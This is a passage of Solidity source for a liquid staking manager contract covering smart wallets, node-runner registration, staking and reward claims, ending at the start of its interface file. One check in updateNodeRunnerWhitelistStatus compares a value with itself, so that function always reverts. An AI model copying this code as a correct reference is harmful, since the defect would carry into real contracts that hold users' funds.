another contract\n    /// @param _nodeRunner Address of the node runner that created the wallet\n    /// @param _to Address of the target contract\n    /// @param _data Encoded data of the function call\n    /// @param _value Total value attached to the transaction\n    function executeAsSmartWallet(\n        address _nodeRunner,\n        address _to,\n        bytes calldata _data,\n        uint256 _value\n    ) external payable onlyDAO {\n        address smartWallet = smartWalletOfNodeRunner[_nodeRunner];\n        require(smartWallet != address(0), \"No wallet found\");\n        IOwnableSmartWallet(smartWallet).execute(\n            _to,\n            _data,\n            _value\n        );\n    }\n\n    /// @notice For knots no longer operational, DAO can de register the knot from the syndicate\n    function deRegisterKnotFromSyndicate(bytes[] calldata _blsPublicKeys) external onlyDAO {\n        Syndicate(payable(syndicate)).deRegisterKnots(_blsPublicKeys);\n    }\n\n    /// @notice In preparation of a rage quit, restore sETH to a smart wallet which are recoverable with the execution methods in the event this step does not go to plan\n    /// @param _smartWallet Address of the smart wallet that will undertake the rage quit\n    /// @param _blsPublicKeys List of BLS public keys being processed (assuming DAO only has BLS pub keys from correct smart wallet)\n    /// @param _amounts Amounts of free floating sETH that will be unstaked\n    function restoreFreeFloatingSharesToSmartWalletForRageQuit(\n        address _smartWallet,\n        bytes[] calldata _blsPublicKeys,\n        uint256[] calldata _amounts\n    ) external onlyDAO {\n        stakingFundsVault.unstakeSyndicateSharesForRageQuit(\n            _smartWallet,\n            _blsPublicKeys,\n            _amounts\n        );\n    }\n\n    /// @notice Allow DAO to migrate to a new address\n    function updateDAOAddress(address _newAddress) external onlyDAO {\n        require(_newAddress != address(0), \"Zero address\");\n        require(_newAddress != dao, \"Same address\");\n\n        emit UpdateDAOAddress(dao, _newAddress);\n\n        dao = _newAddress;\n    }\n\n    /// @notice Allow DAO to take a commission of network revenue\n    function updateDAORevenueCommission(uint256 _commissionPercentage) external onlyDAO {\n        require(_commissionPercentage != daoCommissionPercentage, \"Same commission percentage\");\n        _updateDAORevenueCommission(_commissionPercentage);\n    }\n\n    /// @notice Allow the DAO to rotate the network ticker before the network house is created\n    function updateTicker(string calldata _newTicker) external onlyDAO {\n        require(bytes(_newTicker).length >= 3, \"String must be 3-5 characters long\");\n        require(bytes(_newTicker).length <= 5, \"String must be 3-5 characters long\");\n        require(numberOfKnots == 0, \"Cannot change ticker once house is created\");\n\n        stakehouseTicker = _newTicker;\n\n        emit NetworkTickerUpdated(_newTicker);\n    }\n\n    /// @notice function to change whether node runner whitelisting of node runners is required by the DAO\n    /// @param _changeWhitelist boolean value. true to enable and false to disable\n    function updateWhitelisting(bool _changeWhitelist) external onlyDAO returns (bool) {\n        require(_changeWhitelist != enableWhitelisting, \"Unnecessary update to same status\");\n        enableWhitelisting = _changeWhitelist;\n        emit WhitelistingStatusChanged(msg.sender, enableWhitelisting);\n\n        return enableWhitelisting;\n    }\n\n    /// @notice function to enable/disable whitelisting of a noderunner\n    /// @param _nodeRunner address of the node runner\n    /// @param isWhitelisted true if the node runner should be whitelisted. false otherwise.\n    function updateNodeRunnerWhitelistStatus(address _nodeRunner, bool isWhitelisted) external onlyDAO {\n        require(_nodeRunner != address(0), \"Zero address\");\n        require(isNodeRunnerWhitelisted[_nodeRunner] != isNodeRunnerWhitelisted[_nodeRunner], \"Unnecessary update to same status\");\n\n        isNodeRunnerWhitelisted[_nodeRunner] = isWhitelisted;\n        emit NodeRunnerWhitelistingStatusChanged(_nodeRunner, isWhitelisted);\n    }\n\n    /// @notice Allow a node runner to rotate the EOA representative they use for their smart wallet\n    /// @dev if any KNOT is staked for a smart wallet, no rep can be appointed or updated until the derivatives are minted\n    /// @param _newRepresentative address of the new representative to be appointed\n    function rotateEOARepresentative(address _newRepresentative) external {\n        require(_newRepresentative != address(0), \"Zero address\");\n        require(isNodeRunnerBanned(msg.sender) == false, \"Node runner is banned from LSD network\");\n\n        address smartWallet = smartWalletOfNodeRunner[msg.sender];\n        require(smartWallet != address(0), \"No smart wallet\");\n        require(stakedKnotsOfSmartWallet[smartWallet] == 0, \"Not all KNOTs are minted\");\n        require(smartWalletRepresentative[smartWallet] != _newRepresentative, \"Invalid rotation to same EOA\");\n\n        // unauthorize old representative\n        _authorizeRepresentative(smartWallet, smartWalletRepresentative[smartWallet], false);\n\n        // authorize new representative\n        _authorizeRepresentative(smartWallet, _newRepresentative, true);\n    }\n\n    /// @notice Allow DAO to rotate representative in the case that node runner is not available (to facilitate staking)\n    /// @param _nodeRunner address of the node runner\n    /// @param _newRepresentative address of the new representative to be appointed for the node runner\n    function rotateEOARepresentativeOfNodeRunner(address _nodeRunner, address _newRepresentative) external onlyDAO {\n        require(_newRepresentative != address(0), \"Zero address\");\n\n        address smartWallet = smartWalletOfNodeRunner[_nodeRunner];\n        require(smartWallet != address(0), \"No smart wallet\");\n        require(stakedKnotsOfSmartWallet[smartWallet] == 0, \"Not all KNOTs are minted\");\n        require(smartWalletRepresentative[smartWallet] != _newRepresentative, \"Invalid rotation to same EOA\");\n\n        // unauthorize old representative\n        _authorizeRepresentative(smartWallet, smartWalletRepresentative[smartWallet], false);\n\n        // authorize new representative\n        _authorizeRepresentative(smartWallet, _newRepresentative, true);\n    }\n\n    /// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked.\n    /// @dev A banned node runner cannot withdraw ETH for the KNOT. \n    /// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn\n    function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {\n        require(_recipient != address(0), \"Zero address\");\n        require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key has already withdrawn or not a part of LSD network\");\n\n        address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];\n        require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, \"Not the node runner for the smart wallet \");\n        require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, \"Node runner is banned from LSD network\");\n        require(associatedSmartWallet.balance >= 4 ether, \"Insufficient balance\");\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Initials not registered\"\n        );\n\n        // refund 4 ether from smart wallet to node runner's EOA\n        IOwnableSmartWallet(associatedSmartWallet).rawExecute(\n            _recipient,\n            \"\",\n            4 ether\n        );\n\n        // update the mapping\n        bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n\n        emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);\n    }\n\n    /// @notice In the event the node runner coordinates with the DAO to sell their wallet, allow rotation\n    /// @dev EOA representative rotation done outside this method because there may be knots currently staked etc.\n    /// @param _current address of the present node runner of the smart wallet\n    /// @param _new address of the new node runner of the smart wallet\n    function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) external {\n        require(_new != address(0) && _current != _new, \"New is zero or current\");\n\n        address wallet = smartWalletOfNodeRunner[_current];\n        require(wallet != address(0), \"Wallet does not exist\");\n        require(_current == msg.sender || dao == msg.sender, \"Not current owner or DAO\");\n\n        address newRunnerCurrentWallet = smartWalletOfNodeRunner[_new];\n        require(newRunnerCurrentWallet == address(0), \"New runner has a wallet\");\n\n        smartWalletOfNodeRunner[_new] = wallet;\n        nodeRunnerOfSmartWallet[wallet] = _new;\n\n        delete smartWalletOfNodeRunner[_current];\n\n        if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {\n            bannedNodeRunners[_current] = true;\n            emit NodeRunnerBanned(_current);\n        }\n\n        emit NodeRunnerOfSmartWalletRotated(wallet, _current, _new);\n    }\n\n    /// @notice function to allow a node runner to claim ETH from the syndicate from their smart wallet\n    /// @param _recipient End recipient of ETH from syndicate rewards\n    /// @param _blsPubKeys list of BLS public keys to claim reward for\n    function claimRewardsAsNodeRunner(\n        address _recipient,\n        bytes[] calldata _blsPubKeys\n    ) external nonReentrant {\n        require(_blsPubKeys.length > 0, \"No BLS keys specified\");\n        require(_recipient != address(0), \"Zero address\");\n\n        address smartWallet = smartWalletOfNodeRunner[msg.sender];\n        require(smartWallet != address(0), \"Unknown node runner\");\n\n        for(uint256 i; i < _blsPubKeys.length; ++i) {\n            require(isBLSPublicKeyBanned(_blsPubKeys[i]) == false, \"BLS public key is banned or not a part of LSD network\");\n\n            // check that the node runner doesn't claim rewards for KNOTs from other smart wallets\n            require(smartWalletOfKnot[_blsPubKeys[i]] == smartWallet, \"BLS public key doesn't belong to the node runner\");\n        }\n\n        // Fetch ETH accrued\n        uint256 balBefore = address(this).balance;\n        IOwnableSmartWallet(smartWallet).execute(\n            syndicate,\n            abi.encodeWithSelector(\n                Syndicate.claimAsCollateralizedSLOTOwner.selector,\n                address(this),\n                _blsPubKeys\n            )\n        );\n\n        (uint256 nodeRunnerAmount, uint256 daoAmount) = _calculateCommission(address(this).balance - balBefore);\n        (bool transferResult, ) = _recipient.call{value: nodeRunnerAmount}(\"\");\n        require(transferResult, \"Failed to transfer\");\n\n        if (daoAmount > 0) {\n            (transferResult, ) = dao.call{value: daoAmount}(\"\");\n            require(transferResult, \"Failed to transfer\");\n        }\n\n        emit NodeRunnerRewardsClaimed(msg.sender, _recipient);\n    }\n\n    /// @notice register a node runner to LSD by creating a new smart wallet\n    /// @param _blsPublicKeys list of BLS public keys\n    /// @param _blsSignatures list of BLS signatures\n    /// @param _eoaRepresentative EOA representative of wallet\n    function registerBLSPublicKeys(\n        bytes[] calldata _blsPublicKeys,\n        bytes[] calldata _blsSignatures,\n        address _eoaRepresentative\n    ) external payable nonReentrant {\n        uint256 len = _blsPublicKeys.length;\n        require(len >= 1, \"No value provided\");\n        require(len == _blsSignatures.length, \"Unequal number of array values\");\n        require(msg.value == len * 4 ether, \"Insufficient ether provided\");\n        require(!Address.isContract(_eoaRepresentative), \"Only EOA representative permitted\");\n        require(_isNodeRunnerValid(msg.sender) == true, \"Unrecognised node runner\");\n        require(isNodeRunnerBanned(msg.sender) == false, \"Node runner is banned from LSD network\");\n\n        address smartWallet = smartWalletOfNodeRunner[msg.sender];\n\n        if(smartWallet == address(0)) {\n            // create new wallet owned by liquid staking manager\n            smartWallet = smartWalletFactory.createWallet(address(this));\n            emit SmartWalletCreated(smartWallet, msg.sender);\n\n            // associate node runner with the newly created wallet\n            smartWalletOfNodeRunner[msg.sender] = smartWallet;\n            nodeRunnerOfSmartWallet[smartWallet] = msg.sender;\n\n            _authorizeRepresentative(smartWallet, _eoaRepresentative, true);\n        }\n\n        // Ensure that the node runner does not whitelist multiple EOA representatives - they can only have 1 active at a time\n        if(smartWalletRepresentative[smartWallet] != address(0)) {\n            require(smartWalletRepresentative[smartWallet] == _eoaRepresentative, \"Different EOA specified - rotate outside\");\n        }\n\n        {\n            // transfer ETH to smart wallet\n            (bool result,) = smartWallet.call{value: msg.value}(\"\");\n            require(result, \"Transfer failed\");\n            emit WalletCredited(smartWallet, msg.value);\n        }\n\n        for(uint256 i; i < len; ++i) {\n            bytes calldata _blsPublicKey = _blsPublicKeys[i];\n\n            // check if the BLS public key is part of LSD network and is not banned\n            require(isBLSPublicKeyPartOfLSDNetwork(_blsPublicKey) == false, \"BLS public key is banned or not a part of LSD network\");\n\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKey) == IDataStructures.LifecycleStatus.UNBEGUN,\n                \"Lifecycle status must be zero\"\n            );\n\n            // register validtor initals for each of the KNOTs\n            IOwnableSmartWallet(smartWallet).execute(\n                address(getTransactionRouter()),\n                abi.encodeWithSelector(\n                    ITransactionRouter.registerValidatorInitials.selector,\n                    smartWallet,\n                    _blsPublicKey,\n                    _blsSignatures[i]\n                )\n            );\n\n            // register the smart wallet with the BLS public key\n            smartWalletOfKnot[_blsPublicKey] = smartWallet;\n\n            emit NewLSDValidatorRegistered(msg.sender, _blsPublicKey);\n        }\n    }\n\n    /// @inheritdoc ILiquidStakingManager\n    function isBLSPublicKeyPartOfLSDNetwork(bytes calldata _blsPublicKeyOfKnot) public virtual view returns (bool) {\n        return smartWalletOfKnot[_blsPublicKeyOfKnot] != address(0);\n    }\n\n    /// @inheritdoc ILiquidStakingManager\n    function isBLSPublicKeyBanned(bytes calldata _blsPublicKeyOfKnot) public virtual view returns (bool) {\n        return !isBLSPublicKeyPartOfLSDNetwork(_blsPublicKeyOfKnot) || bannedBLSPublicKeys[_blsPublicKeyOfKnot] != address(0);\n    }\n\n    /// @notice function to check if a node runner address is banned\n    /// @param _nodeRunner address of the node runner\n    /// @return true if the node runner is banned, false otherwise\n    function isNodeRunnerBanned(address _nodeRunner) public view returns (bool) {\n        return bannedNodeRunners[_nodeRunner];\n    }\n\n    /// @notice function to check if a KNOT is deregistered\n    /// @param _blsPublicKey BLS public key of the KNOT\n    /// @return true if the KNOT is deregistered, false otherwise\n    function isKnotDeregistered(bytes calldata _blsPublicKey) public view returns (bool) {\n        return Syndicate(payable(syndicate)).isNoLongerPartOfSyndicate(_blsPublicKey);\n    }\n\n    /// @notice Anyone can call this to trigger staking once they have all of the required input params from BLS authentication\n    /// @param _blsPublicKeyOfKnots List of knots being staked with the Ethereum deposit contract (32 ETH sourced within the network)\n    /// @param _ciphertexts List of backed up validator operations encrypted and stored to the Ethereum blockchain\n    /// @param _aesEncryptorKeys List of public identifiers of credentials that performed the trustless backup\n    /// @param _encryptionSignatures List of EIP712 signatures attesting to the correctness of the BLS signature\n    /// @param _dataRoots List of serialized SSZ containers of the DepositData message for each validator used by Ethereum deposit contract\n    function stake(\n        bytes[] calldata _blsPublicKeyOfKnots,\n        bytes[] calldata _ciphertexts,\n        bytes[] calldata _aesEncryptorKeys,\n        IDataStructures.EIP712Signature[] calldata _encryptionSignatures,\n        bytes32[] calldata _dataRoots\n    ) external {\n        uint256 numOfValidators = _blsPublicKeyOfKnots.length;\n        require(numOfValidators > 0, \"No data\");\n        require(numOfValidators == _ciphertexts.length, \"Inconsistent array lengths\");\n        require(numOfValidators == _aesEncryptorKeys.length, \"Inconsistent array lengths\");\n        require(numOfValidators == _encryptionSignatures.length, \"Inconsistent array lengths\");\n        require(numOfValidators == _dataRoots.length, \"Inconsistent array lengths\");\n\n        for (uint256 i; i < numOfValidators; ++i) {\n            bytes calldata blsPubKey = _blsPublicKeyOfKnots[i];\n            // check if BLS public key is registered with liquid staking derivative network and not banned\n            require(isBLSPublicKeyBanned(blsPubKey) == false, \"BLS public key is banned or not a part of LSD network\");\n\n            address associatedSmartWallet = smartWalletOfKnot[blsPubKey];\n            require(associatedSmartWallet != address(0), \"Unknown BLS public key\");\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n                \"Initials not registered\"\n            );\n\n            // check minimum balance of smart wallet, dao staking fund vault and savETH vault\n            _assertEtherIsReadyForValidatorStaking(blsPubKey);\n\n            _stake(\n                _blsPublicKeyOfKnots[i],\n                _ciphertexts[i],\n                _aesEncryptorKeys[i],\n                _encryptionSignatures[i],\n                _dataRoots[i]\n            );\n\n            address representative = smartWalletRepresentative[associatedSmartWallet];\n\n            if(representative != address(0)) {\n                // unauthorize the EOA representative on the Stakehouse\n                _authorizeRepresentative(associatedSmartWallet, representative, false);\n                // make the representative dormant before unauthorizing it\n                smartWalletDormantRepresentative[associatedSmartWallet] = representative;\n                emit DormantRepresentative(associatedSmartWallet, representative);\n            }\n        }\n    }\n\n    /// @notice Anyone can call this to trigger creating a knot which will mint derivatives once the balance has been reported\n    /// @param _blsPublicKeyOfKnots List of BLS public keys registered with the network becoming knots and minting derivatives\n    /// @param _beaconChainBalanceReports List of beacon chain balance reports\n    /// @param _reportSignatures List of attestations for the beacon chain balance reports\n    function mintDerivatives(\n        bytes[] calldata _blsPublicKeyOfKnots,\n        IDataStructures.ETH2DataReport[] calldata _beaconChainBalanceReports,\n        IDataStructures.EIP712Signature[] calldata _reportSignatures\n    ) external {\n        uint256 numOfKnotsToProcess = _blsPublicKeyOfKnots.length;\n        require(numOfKnotsToProcess > 0, \"Empty array\");\n        require(numOfKnotsToProcess == _beaconChainBalanceReports.length, \"Inconsistent array lengths\");\n        require(numOfKnotsToProcess == _reportSignatures.length, \"Inconsistent array lengths\");\n\n        for (uint256 i; i < numOfKnotsToProcess; ++i) {\n            // check if BLS public key is registered and not banned\n            require(isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, \"BLS public key is banned or not a part of LSD network\");\n\n            // check that the BLS pub key has deposited lifecycle\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnots[i]) == IDataStructures.LifecycleStatus.DEPOSIT_COMPLETED,\n                \"Lifecycle status must be two\"\n            );\n\n            // The first knot will create the Stakehouse\n            if(numberOfKnots == 0) {\n                _createLSDNStakehouse(\n                    _blsPublicKeyOfKnots[i],\n                    _beaconChainBalanceReports[i],\n                    _reportSignatures[i]\n                );\n            }\n            else {\n                // join stakehouse\n                _joinLSDNStakehouse(\n                    _blsPublicKeyOfKnots[i],\n                    _beaconChainBalanceReports[i],\n                    _reportSignatures[i]\n                );\n            }\n\n            address smartWallet = smartWalletOfKnot[_blsPublicKeyOfKnots[i]];\n            stakedKnotsOfSmartWallet[smartWallet] -= 1;\n\n            if(stakedKnotsOfSmartWallet[smartWallet] == 0) {\n                _authorizeRepresentative(smartWallet, smartWalletDormantRepresentative[smartWallet], true);\n\n                // delete the dormant representative as it is set active\n                delete smartWalletDormantRepresentative[smartWallet];\n            }\n\n            // Expand the staking funds vault shares that can claim rewards\n            stakingFundsVault.updateDerivativesMinted();\n        }\n    }\n\n    receive() external payable {}\n\n    /// @notice Every liquid staking derivative network has a single fee recipient determined by its syndicate contract\n    /// @dev The syndicate contract is only deployed after the first KNOT to mint derivatives creates the network Stakehouse\n    /// @dev Because the syndicate contract for the LSDN is deployed with CREATE2, we can predict the fee recipient ahead of time\n    /// @dev This is important because node runners need to configure their nodes before or immediately after staking\n    function getNetworkFeeRecipient() external view returns (address) {\n        // Always 1 knot initially registered to the syndicate because we expand it one by one\n        return syndicateFactory.calculateSyndicateDeploymentAddress(\n            address(this),\n            address(this),\n            1\n        );\n    }\n\n    /// @dev Internal method for managing the initialization of the staking manager contract\n    function _init(\n        address _dao,\n        address _syndicateFactory,\n        address _smartWalletFactory,\n        address _lpTokenFactory,\n        address _brand,\n        address _savETHVaultDeployer,\n        address _stakingFundsVaultDeployer,\n        address _optionalGatekeeperDeployer,\n        uint256 _optionalCommission,\n        bool _deployOptionalGatekeeper,\n        string calldata _stakehouseTicker\n    ) internal {\n        require(_dao != address(0), \"Zero address\");\n        require(_syndicateFactory != address(0), \"Zero address\");\n        require(_smartWalletFactory != address(0), \"Zero address\");\n        require(_brand != address(0), \"Zero address\");\n        require(bytes(_stakehouseTicker).length >= 3, \"String must be 3-5 characters long\");\n        require(bytes(_stakehouseTicker).length <= 5, \"String must be 3-5 characters long\");\n\n        brand = _brand;\n        dao = _dao;\n        syndicateFactory = ISyndicateFactory(_syndicateFactory);\n        smartWalletFactory = IOwnableSmartWalletFactory(_smartWalletFactory);\n        stakehouseTicker = _stakehouseTicker;\n\n        _updateDAORevenueCommission(_optionalCommission);\n\n        _initStakingFundsVault(_stakingFundsVaultDeployer, _lpTokenFactory);\n        _initSavETHVault(_savETHVaultDeployer, _lpTokenFactory);\n\n        if (_deployOptionalGatekeeper) {\n            gatekeeper = OptionalGatekeeperFactory(_optionalGatekeeperDeployer).deploy(address(this));\n        }\n    }\n\n    /// @dev function checks if a node runner is valid depending upon whitelisting status\n    /// @param _nodeRunner address of the user requesting to become node runner\n    /// @return true if eligible. reverts with message if not eligible\n    function _isNodeRunnerValid(address _nodeRunner) internal view returns (bool) {\n        require(_nodeRunner != address(0), \"Zero address\");\n\n        if(enableWhitelisting) {\n            require(isNodeRunnerWhitelisted[_nodeRunner] == true, \"Invalid node runner\");\n        }\n\n        return true;\n    }\n\n    /// @dev Manage the removal and appointing of smart wallet representatives including managing state\n    function _authorizeRepresentative(\n        address _smartWallet, \n        address _eoaRepresentative, \n        bool _isEnabled\n    ) internal {\n        if(!_isEnabled && smartWalletRepresentative[_smartWallet] != address(0)) {\n\n            // authorize the EOA representative on the Stakehouse\n            IOwnableSmartWallet(_smartWallet).execute(\n                address(getTransactionRouter()),\n                abi.encodeWithSelector(\n                    ITransactionRouter.authorizeRepresentative.selector,\n                    _eoaRepresentative,\n                    _isEnabled\n                )\n            );\n\n            // delete the mapping\n            delete smartWalletRepresentative[_smartWallet];\n\n            emit RepresentativeRemoved(_smartWallet, _eoaRepresentative);\n        }\n        else if(_isEnabled && smartWalletRepresentative[_smartWallet] == address(0)) {\n\n            // authorize the EOA representative on the Stakehouse\n            IOwnableSmartWallet(_smartWallet).execute(\n                address(getTransactionRouter()),\n                abi.encodeWithSelector(\n                    ITransactionRouter.authorizeRepresentative.selector,\n                    _eoaRepresentative,\n                    _isEnabled\n                )\n            );\n\n            // store EOA to the wallet mapping\n            smartWalletRepresentative[_smartWallet] = _eoaRepresentative;\n\n            emit RepresentativeAppointed(_smartWallet, _eoaRepresentative);\n        } else {\n            revert(\"Unexpected state\");\n        }\n    }\n\n    /// @dev Internal method for doing just staking - pre-checks done outside this method to avoid stack too deep\n    function _stake(\n        bytes calldata _blsPublicKey,\n        bytes calldata _cipherText,\n        bytes calldata _aesEncryptorKey,\n        IDataStructures.EIP712Signature calldata _encryptionSignature,\n        bytes32 dataRoot\n    ) internal {\n        address smartWallet = smartWalletOfKnot[_blsPublicKey];\n\n        // send 24 ether from savETH vault to smart wallet\n        savETHVault.withdrawETHForStaking(smartWallet, 24 ether);\n\n        // send 4 ether from DAO staking funds vault\n        stakingFundsVault.withdrawETH(smartWallet, 4 ether);\n\n        // interact with transaction router using smart wallet to deposit 32 ETH\n        IOwnableSmartWallet(smartWallet).execute(\n            address(getTransactionRouter()),\n            abi.encodeWithSelector(\n                ITransactionRouter.registerValidator.selector,\n                smartWallet,\n                _blsPublicKey,\n                _cipherText,\n                _aesEncryptorKey,\n                _encryptionSignature,\n                dataRoot\n            ),\n            32 ether\n        );\n\n        // increment number of staked KNOTs in the wallet\n        stakedKnotsOfSmartWallet[smartWallet] += 1;\n\n        emit KnotStaked(_blsPublicKey, msg.sender);\n    }\n\n    /// @dev The second knot onwards will join the LSDN stakehouse and expand the registered syndicate knots\n    function _joinLSDNStakehouse(\n        bytes calldata _blsPubKey,\n        IDataStructures.ETH2DataReport calldata _beaconChainBalanceReport,\n        IDataStructures.EIP712Signature calldata _reportSignature\n    ) internal {\n        // total number of knots created with the syndicate increases\n        numberOfKnots += 1;\n\n        // The savETH will go to the savETH vault, the collateralized SLOT for syndication owned by the smart wallet\n        // sETH will also be minted in the smart wallet but will be moved out and distributed to the syndicate for claiming by the DAO\n        address associatedSmartWallet = smartWalletOfKnot[_blsPubKey];\n\n        // Join the LSDN stakehouse\n        string memory lowerTicker = IBrandNFT(brand).toLowerCase(stakehouseTicker);\n        IOwnableSmartWallet(associatedSmartWallet).execute(\n            address(getTransactionRouter()),\n            abi.encodeWithSelector(\n                ITransactionRouter.joinStakehouse.selector,\n                associatedSmartWallet,\n                _blsPubKey,\n                stakehouse,\n                IBrandNFT(brand).lowercaseBrandTickerToTokenId(lowerTicker),\n                savETHVault.indexOwnedByTheVault(),\n                _beaconChainBalanceReport,\n                _reportSignature\n            )\n        );\n\n        // Register the knot to the syndicate\n        bytes[] memory _blsPublicKeyOfKnots = new bytes[](1);\n        _blsPublicKeyOfKnots[0] = _blsPubKey;\n        Syndicate(payable(syndicate)).registerKnotsToSyndicate(_blsPublicKeyOfKnots);\n\n        // Autostake DAO sETH with the syndicate\n        _autoStakeWithSyndicate(associatedSmartWallet, _blsPubKey);\n\n        emit StakehouseJoined(_blsPubKey);\n    }\n\n    /// @dev Perform all the steps required to create the LSDN stakehouse that other knots will join\n    function _createLSDNStakehouse(\n        bytes calldata _blsPublicKeyOfKnot,\n        IDataStructures.ETH2DataReport calldata _beaconChainBalanceReport,\n        IDataStructures.EIP712Signature calldata _reportSignature\n    ) internal {\n        // create stakehouse and mint derivative for first bls key - the others are just used to create the syndicate\n        // The savETH will go to the savETH vault, the collateralized SLOT for syndication owned by the smart wallet\n        // sETH will also be minted in the smart wallet but will be moved out and distributed to the syndicate for claiming by the DAO\n        address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];\n        IOwnableSmartWallet(associatedSmartWallet).execute(\n            address(getTransactionRouter()),\n            abi.encodeWithSelector(\n                ITransactionRouter.createStakehouse.selector,\n                associatedSmartWallet,\n                _blsPublicKeyOfKnot,\n                stakehouseTicker,\n                savETHVault.indexOwnedByTheVault(),\n                _beaconChainBalanceReport,\n                _reportSignature\n            )\n        );\n\n        // Number of knots has increased\n        numberOfKnots += 1;\n\n        // Capture the address of the Stakehouse for future knots to join\n        stakehouse = getStakeHouseUniverse().memberKnotToStakeHouse(_blsPublicKeyOfKnot);\n        IERC20 sETH = IERC20(getSlotRegistry().stakeHouseShareTokens(stakehouse));\n\n        // Give liquid staking manager ability to manage keepers and set a house keeper if decided by the network\n        IOwnableSmartWallet(associatedSmartWallet).execute(\n            stakehouse,\n            abi.encodeWithSelector(\n                Ownable.transferOwnership.selector,\n                address(this)\n            )\n        );\n\n        if (address(gatekeeper) != address(0)) {\n            IStakeHouseRegistry(stakehouse).setGateKeeper(address(gatekeeper));\n        }\n\n        // Deploy the EIP1559 transaction reward sharing contract but no priority required because sETH will be auto staked\n        address[] memory priorityStakers = new address[](0);\n        bytes[] memory initialKnots = new bytes[](1);\n        initialKnots[0] = _blsPublicKeyOfKnot;\n        syndicate = syndicateFactory.deploySyndicate(\n            address(this),\n            0,\n            priorityStakers,\n            initialKnots\n        );\n\n        // Contract approves syndicate to take sETH on behalf of the DAO\n        sETH.approve(syndicate, (2 ** 256) - 1);\n\n        // Auto-stake sETH by pulling sETH out the smart wallet and staking in the syndicate\n        _autoStakeWithSyndicate(associatedSmartWallet, _blsPublicKeyOfKnot);\n\n        emit StakehouseCreated(stakehouseTicker, stakehouse);\n    }\n\n    /// @dev Remove the sETH from the node runner smart wallet in order to auto-stake the sETH in the syndicate\n    function _autoStakeWithSyndicate(address _associatedSmartWallet, bytes memory _blsPubKey) internal {\n        IERC20 sETH = IERC20(getSlotRegistry().stakeHouseShareTokens(stakehouse));\n\n        uint256 stakeAmount = 12 ether;\n        IOwnableSmartWallet(_associatedSmartWallet).execute(\n            address(sETH),\n            abi.encodeWithSelector(\n                IERC20.transfer.selector,\n                address(this),\n                stakeAmount\n            )\n        );\n\n        // Create the payload for staking\n        bytes[] memory stakingKeys = new bytes[](1);\n        stakingKeys[0] = _blsPubKey;\n\n        uint256[] memory stakeAmounts = new uint256[](1);\n        stakeAmounts[0] = stakeAmount;\n\n        // Stake the sETH to be received by the LPs of the Staking Funds Vault (fees and mev)\n        Syndicate(payable(syndicate)).stake(stakingKeys, stakeAmounts, address(stakingFundsVault));\n    }\n\n    /// @dev Something that can be overriden during testing\n    function _initSavETHVault(address _savETHVaultDeployer, address _lpTokenFactory) internal virtual {\n        // Use an external deployer to reduce the size of the liquid staking manager\n        savETHVault = SavETHVault(\n            SavETHVaultDeployer(_savETHVaultDeployer).deploySavETHVault(address(this), _lpTokenFactory)\n        );\n    }\n\n    function _initStakingFundsVault(address _stakingFundsVaultDeployer, address _tokenFactory) internal virtual {\n        stakingFundsVault = StakingFundsVault(\n            payable(StakingFundsVaultDeployer(_stakingFundsVaultDeployer).deployStakingFundsVault(\n                address(this),\n                _tokenFactory\n            ))\n        );\n    }\n\n    /// @dev This can be overriden to customise fee percentages\n    function _calculateCommission(uint256 _received) internal virtual view returns (uint256 _nodeRunner, uint256 _dao) {\n        require(_received > 0, \"Nothing received\");\n\n        if (daoCommissionPercentage > 0) {\n            uint256 daoAmount = (_received * daoCommissionPercentage) / MODULO;\n            uint256 rest = _received - daoAmount;\n            return (rest, daoAmount);\n        }\n\n        return (_received, 0);\n    }\n\n    /// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achieved\n    function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {\n        address associatedSmartWallet = smartWalletOfKnot[blsPubKey];\n        require(associatedSmartWallet.balance >= 4 ether, \"Smart wallet balance must be at least 4 ether\");\n\n        LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);\n        require(address(stakingFundsLP) != address(0), \"No funds staked in staking funds vault\");\n        require(stakingFundsLP.totalSupply() == 4 ether, \"DAO staking funds vault balance must be at least 4 ether\");\n\n        LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);\n        require(address(savETHVaultLP) != address(0), \"No funds staked in savETH vault\");\n        require(savETHVaultLP.totalSupply() == 24 ether, \"KNOT must have 24 ETH in savETH vault\");\n    }\n\n    /// @dev Internal method for dao to trigger updating commission it takes of node runner revenue\n    function _updateDAORevenueCommission(uint256 _commissionPercentage) internal {\n        require(_commissionPercentage <= MODULO, \"Invalid commission\");\n\n        emit DAOCommissionUpdated(daoCommissionPercentage, _commissionPercentage);\n\n        daoCommissionPercentage = _commissionPercentage;\n    }\n}\n\n\npragma solidity 0.8.13;\n\n// SPDX-License-Identifier: MIT\n\ninterface ILiquidStakingManager {\n\n    function stakehouse() external view returns (address);\n\n    /// @param _dao address of the DAO\n    /// @param _syndicateFactory address of the syndicate factory\n    /// @param _smartWalletFactory address of the smart wallet factory\n    /// @param _lpTokenFactory LP token factory address required for deployment of savETH vault\n    /// @param _stakehouseTicker 3-5 character long name for the stakehouse to be deployed\n    function init(\n        address _dao,\n        address _syndicateFactory,\n        address _smartWalletFactory,\n        